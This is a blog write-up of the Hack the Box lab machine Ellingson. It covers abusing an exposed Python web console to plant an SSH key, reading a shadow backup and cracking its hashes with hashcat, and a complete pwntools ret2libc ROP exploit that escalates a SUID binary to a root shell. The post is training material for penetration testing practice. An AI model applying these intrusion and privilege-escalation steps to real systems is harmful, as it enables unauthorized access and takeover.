---
layout:     post
title2:      HacktheBox Writeup - Ellingson - padraignix.github.io 
title:     Hack the Box - Ellingson
date:       2019-10-19 12:00:00 -0400
summary:    HTB Ellingson machine walkthrough. Web enumeration and python console abuse for initial foothold, finding sensitive backup files and hashcat cracking for User pivot, finally into a ROP based overflow exploit for root priviledge escalation.
categories: [hack-the-box]
thumbnail:  cogs
keywords:   hackthebox,htb,pentest,redteam,writeup,walkthrough,buffer overflow,python,ghidra,pwnlib,hashcat,rop,ellingson
thumbnail:  https://padraignix.github.io/assets/htb-ellingson/infocard.PNG
canon:      https://padraignix.github.io/hack-the-box/2019/10/19/htb-machine-ellingson/
tags:
 - htb 
 - buffer-overflow
 - rop
 - hashcat
 - pwnlib
 - ghidra
---

<h1>Introduction</h1>
<p>
<img width="75%" height="75%" src="{{ '/assets/htb-ellingson/infocard.PNG' | relative_url }}">
</p>

<p>Ellingson was a very interesting box personally. Marked as hard by Hackthebox it involved web enumeration and python console abuse for initial foothold, finding sensitive backup files and hashcat cracking for user pivot, finally into a ROP based overflow exploit for root priviledge escalation. Ellingson was the second ROP based exploit machine I've worked on within HTB. The first machine, still an active box and will remain unnamed until that writeup is released, was more simplistic than Ellingson and acted as a good base to understand the concepts. This machine required more advanced tactics involving a ret2libc approach and while I developed the exploit manually for the first machine I took the opportunity here to work with a more advanced framework - python's pwn lib.</p>

<h1>Initial Recon</h1>

<p>As usual, let's start it off with an <code>nmap</code> enumeration.</p>

{% highlight shell %}
nmap -sV -sC 10.10.10.139 -v

...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)
|   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:df (ECDSA)
|_  256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
| http-title: Ellingson Mineral Corp
|_Requested resource was http://10.10.10.139/index
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
{% endhighlight %}

<p>Nothing out of the usual so let's take a look at the web service and see what we can find. Looks like a company page. Before we start poking around manually we make sure to kick off burp and get a better idea of the layout.</p>

<p>
<img src="{{ '/assets/htb-ellingson/burp.PNG' | relative_url }}">
</p>

<p>After taking a look at the various pages, there was some interesting information on the various articles. There was some discussion about previous security incidents and some common password warnings.</p>

<p>
<img src="{{ '/assets/htb-ellingson/article1.PNG' | relative_url }}">
</p>

<p>
<img src="{{ '/assets/htb-ellingson/article3.PNG' | relative_url }}">
</p>

<p>It seems we're loading the various articles by just going to the reference page number url. Let's see what happens when we try to go to a page that doesn't exist like "4".</p>

<p>
<img src="{{ '/assets/htb-ellingson/article4.PNG' | relative_url }}">
</p>

<p>Ok some error messages and leakage indicating that at least python is installed on the machine. While scrolling through the error messages I accidentally moved my over to the side and noticed a terminal icon pop up. I thought that seemed quite weird, so looking further into it I quickly realized this was actually a python console, running as the user hal!</p>

<p>
<img src="{{ '/assets/htb-ellingson/hal.PNG' | relative_url }}">
</p>

<p>With some initial poking around I realized that there were four users (or at least for homedirectories). Since we were running as hal we had access to his homedir. Unfortunately, no user flag present there, however we did have access to his <code>.ssh</code> folder and subsequently <code>authorized_keys</code>. Let's add our own in there and see if we can get access properly through ssh.</p>

{% highlight shell %}
>>> os.chdir("/home/hal")
>>> os.getcwd()
'/home/hal'
>>> dirlist = glob.glob('.*')
>>> print(dirlist)
['.profile', '.bashrc', '.ssh', '.local', '.gnupg', '.bash_logout', '.viminfo', '.cache']
>>> os.chdir(".ssh")
>>> dirlist = glob.glob('*')
>>> print(dirlist)
['id_rsa', 'authorized_keys', 'id_rsa.pub']
>>>open('authorized_keys', 'a+').write('\nssh-rsa AAAAB3N...XBuOItl root@kali\n')
{% endhighlight %}

<p>And with that we now have proper shell access.</p>

<p>
<img src="{{ '/assets/htb-ellingson/hal-ssh.PNG' | relative_url }}">
</p>

<h1>User exploitation</h1>

<p>Since hal wasn't the true "user" in this case we know we still need to pivot to one of the remaining users. As as first step let's get some recon scripts over to the host.</p>

{% highlight shell %}
root@kali:../tools# scp LinEnum.sh hal@10.10.10.139:/home/hal/
LinEnum.sh                       100%   45KB 513.4KB/s   00:00    
{% endhighlight %}

<p>Unfortunately nothing really pops out as a result of running it so back to the drawing board. After scratching my head for a bit I realized something that was right in my face from the initial shell access.</p>

{% highlight shell %}
hal@ellingson:~$ id
uid=1001(hal) gid=1001(hal) groups=1001(hal),4(adm)
{% endhighlight %}

<p>That's right, hal is also part of the adm group. Now what does that give us as far as information.</p>

{% highlight shell %}
hal@ellingson:~$ find / -group adm 2> /dev/null | head -n1
/var/backups/shadow.bak
hal@ellingson:~$ cat /var/backups/shadow.bak | tail -n 4
theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::
hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::
margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::
duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::
{% endhighlight %}

<p>Just like that looks like we have the password hashes for the four users! Time to format a file and see if we can crack this with <code>hashcat</code>.</p>

<p>
<img src="{{ '/assets/htb-ellingson/hashcat.PNG' | relative_url }}">
</p>

<p>Kicking off <code>hashcat</code> using <code>-m 1800</code> and the trusty old rockyou wordlist we manage to crack two of the hashes - for <code>theplague</code> and for <code>margo</code>.</p>

{% highlight shell %}
hashcat-5.1.0>./hashcat64.exe -m 1800 -a 0 ..\hashes.txt ..\rockyou.txt
...
$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:password123
$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:iamgod$08
{% endhighlight %}

<p>I tried ssh'ing in as <code>theplague</code> first, unfortunately that password seemed to have been changed since the backup was taken. Alright, let's give <code>margo</code> a chance.</p>

<p>
<img src="{{ '/assets/htb-ellingson/user.PNG' | relative_url }}">
</p>

<p>Bam! User in the books, let's move on to root.</p>

<h1>Root exploitation</h1>

<p>Having moved the privesc scripts over from the previous pivot I decided to rerun them and see if anything else comes up now that we are running as <code>margo</code>. This time I noticed a process binary <code>garbage</code> I wasn't familiar with. Looks like it also has SUID set. A quick search online didn't return anything for <code>/usr/bin/garbage</code>. That seems promising, let's take a closer look.</p>

<p>
<img src="{{ '/assets/htb-ellingson/rootenum-suid.PNG' | relative_url }}">
</p>

<p>
<img src="{{ '/assets/htb-ellingson/root-garbage-initial.PNG' | relative_url }}">
</p>

<p>Hum...ok so need to supply a password. Let's see if we can overflow it.</p>

<p>
<img src="{{ '/assets/htb-ellingson/root-garbage-fuzz.PNG' | relative_url }}">
</p>

<p>SUID set, check. Overflowable, check. I think we have ourselves an attack vector. For ease of investigation let's grab a copy of the binary and bring it over to our own machine. Before diving into <code>gdb</code> I opened up <code>ghidra</code> to see what can be found with a decompile. We see the password it is searching for in the clear.</p>

<p>
<img src="{{ '/assets/htb-ellingson/root-garbage-ghidra1.PNG' | relative_url }}">
</p>

<p>
<img src="{{ '/assets/htb-ellingson/root-garbage-ghidra2.PNG' | relative_url }}">
</p>

<p>Now, let's try the password and see if we get any further.</p>

<p>
<img src="{{ '/assets/htb-ellingson/root-garbage-password.PNG' | relative_url }}">
</p>

<h3>Enter the ROP</h3>

<p>While interesting, the process itself doesn't seem to do anything useful. Let's go back to our local version and attach <code>gdb</code> this time with a unique pattern created to perform the overlfow.</p>

<p>
<img src="{{ '/assets/htb-ellingson/garbage-gdb-fuzz1.PNG' | relative_url }}">
</p>

{% highlight shell %}
$rsp   : 0x00007fffd6e11b08  →  "e5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1[...]"
$rbp   : 0x4134654133654132 ("2Ae3Ae4A"?)

root@kali:~/Desktop/HTB/Ellingson# /usr/bin/msf-pattern_offset -q e5Ae
[*] Exact match at offset 136
{% endhighlight %}

<p>So we know that the exact offset is 136 and from then on we control the stack. I initially forgot to what types of restrictions the binary had. Let's quickly do that as well.</p>

<p>
<img src="{{ '/assets/htb-ellingson/garbage-gdb-checksec.PNG' | relative_url }}">
</p>

<p>Alright so the stack is non-executable. Since we control the stack and NX is set this seems like ROP territory. Unfortunately looking at the <code>ghidra</code> decompile there doesn't seem to be anything locally sourcable like <code>system()</code> within the binary. Last check, with our <code>margo</code> console let's see if ASLR is set - sure enough it is.</p>

<p>
<img src="{{ '/assets/htb-ellingson/garbage-aslr.PNG' | relative_url }}">
</p>

<p>Our understanding so far:
      <ul>
        <li>ASLR is set - code from external libraries will not always be at the same memory address.</li>
        <li>We control the stack.</li>
        <li>NX is set - we cannot put executable code onto the stack.</li>
        <li>No locally sourced functions within the binary seem interesting.</li>
      </ul>
</p>

<p>While there aren't any <code>system()</code> style calls we can leverage (i.e. that would be at the same address offsets we can call) there are several <code>puts()</code> calls being made. Since this is part of <code>libc</code> we may be able to leverage this to our advantage. From having ASLR set unfortunately we know that the library will load at a different address each time. Although the adress will be randomized, it's only the base that is randomized. Since we are calling <code>puts()</code> we will have insight into <code>libc</code>. If we can get an exact copy of the version being used, we can use the <code>puts()</code> offset to calculate the base address of <code>libc</code> and ultimately be able to call any function within it. With that said, our approach comes down to:</p>
<p>
      <ul>
        <li>Get a copy of the <code>libc</code> version running on Ellingson.</li>
        <li>Find a way to leak the address using <code>puts()</code>.</li>
        <li>Calculate the offset based on leaked address to leverage <code>system()</code>.</li>
        <li>Add <code>system()</code> as <code>uid=0</code> to our ROP chain.</li>
      </ul>
</p>
<p>The first part was simple enough. As <code>margo</code> we were able to copy the <code>libc</code> library on to our local machine. Combined with the <code>garbage</code> binary we have everything we need to try and get this to work.</p>

{% highlight shell %}
margo@ellingson:~$ ldd /usr/bin/garbage
	linux-vdso.so.1 (0x00007fffbcdf2000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5d6eb2b000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f5d6ef1c000)
margo@ellingson:~$ exit
logout
Connection to 10.10.10.139 closed.
root@kali:~/Desktop/HTB/Ellingson# scp margo@10.10.10.139:/lib/x86_64-linux-gnu/libc.so.6 .
margo@10.10.10.139's password: 
libc.so.6                         
{% endhighlight %}

<p>At this point I could continue to develop the exploit manually. Since I did that with the other HTB machine I wanted to explore other ways of getting this done. During my research I saw several references to python's <code>pwn lib</code> library and decided I would take the opportunity to learn how to use it. <a href="http://docs.pwntools.com/en/stable/intro.html">pwn lib intro</a> and <a href="http://docs.pwntools.com/en/stable/rop/rop.html">pwn lib ROP</a>  reference documentation was invaluable in understanding how the library worked.<p>

<h3>PWN lib</h3>

<p>Let's get the initial template setup. We have <code>margo</code>'s password so let's connect to the host and call the binary.</p>

{% highlight python %}
from pwn import *

import warnings

#Ignore paramiko ssh encryption warnings - https://github.com/ansible/ansible/issues/52598
warnings.filterwarnings(action='ignore',module='.*paramiko.*')

context(terminal=['tmux','new-window'])
context(os = 'linux', arch = 'amd64')
shell = ssh(host='10.10.10.139', user="margo", password="iamgod$08")
p = shell.run("/bin/bash")
p.sendline("/usr/bin/garbage")

#Checking extra information while developing
context.log_level = 'DEBUG'

#Pull local versions of binary and libc, creating pwnlib objects 
garbage = ELF('garbage')
libc = ELF('libc.so.6')

#Junk characters to fill up buffer
junk = "A" * 136

payload = junk + junk
p.recvuntil('password:')
p.sendline(payload)
p.recvuntil('denied.')
{% endhighlight %}

<p>
<img src="{{ '/assets/htb-ellingson/garbage-pwnlib.PNG' | relative_url }}">
</p>

<p>So far so good, let's start adding the ROP section. Our initial effort is to call <code>puts()</code> and leak the address. We find a <code>pop rdi,ret</code> gadget then add libc's <code>puts</code> address from the <i>global offset table</i> to the stack, then call <code>puts()</code> to print the address. Finally we call the <i>main</i> function to loop the execution flow back and avoid having the binary break.</p>

{% highlight python %}
#ROP Chain designed to leak libc address
rop.search(regs=['rdi'], order='regs')
rop.puts(garbage.got['puts'])
#Recall main once overflowed
rop.call(garbage.symbols['main'])
print "ROP Chain:\n{}".format(rop.dump())

payload = junk + str(rop)
{% endhighlight %}

<p>
<img src="{{ '/assets/htb-ellingson/garbage-pwnlib-rop.PNG' | relative_url }}">
</p>

<p>Perfect. Now let's see if we can print out the address and run it a few times to see it in action.</p>

{% highlight python %}
payload = junk + str(rop)
p.recvuntil('password:')
p.sendline(payload)
leak = p.recvuntil('denied.')
leaked_puts_address_in_libc = p.recv()[:8].strip().ljust(8, "\x00")

libcaddr = u64(leaked_puts_address_in_libc)
print("LIBC Puts() address {}".format(hex(libcaddr)))
{% endhighlight %}

<p>
<img src="{{ '/assets/htb-ellingson/garbage-pwnlib-rop-libcaddr.PNG' | relative_url }}">
</p>

<p>Great! Now that we have the offsetted <code>puts()</code> address we can come up with our second ROP chain, this time hopefully to execute <code>system()</code> and pop our root shell.</p>

{% highlight python %}
#Add ROP to execute system(/bin/bash) as uid=0
#based on the leaked libc addresses
libc.address = leaked_puts_address_in_libc - libc.symbols['puts']
print("LIBC Main address {}".format(hex(libc.address)))

rop2 = ROP(libc)
rop2.setuid(0x0)
rop2.system(next(libc.search('/bin/sh\x00')))
print "ROP Chain:\n{}".format(rop2.dump())

#Format the second payload
payload = junk + str(rop2)
p.sendline(payload)
p.recvuntil('denied.')
p.interactive()
{% endhighlight %}

<p>
<img src="{{ '/assets/htb-ellingson/root-owned.PNG' | relative_url }}">
</p>

<p>And with that, Ellingson is in the books.</p>

<h1>Extra notes</h1>

<p>After the pain of manually developing the ROP exploit for the other active box I was shook at how easy and intuitive <code>pwn lib</code> really was. I definitely suggest going through both approaches to understand the concepts at a deeper level but once you understand how it works this library definitely helps speed up the process.<p>

<p>Personally I'm giving myself a few follow ups from having this box completed:</p>
<p>
      <ul>
        <li>Go back to the other ROP exploit and see if using <code>pwn lib</code> makes the exploit easier than my kludgey way of doing it.</li>
        <li>Explore further the functionality of <code>pwn lib</code> and what else it can offer / become more familiar with the various uses.</li>
        <li>Follow up my first <a href="{{ site.baseurl }}{% link _posts/2019-09-28-buffer-overflow-practical-case-study.md %}">buffer overflow</a> presentation with a second one covering ROP and more advanced topics.</li>
      </ul>
</p>
<p>Thanks folks. Until next time.</p>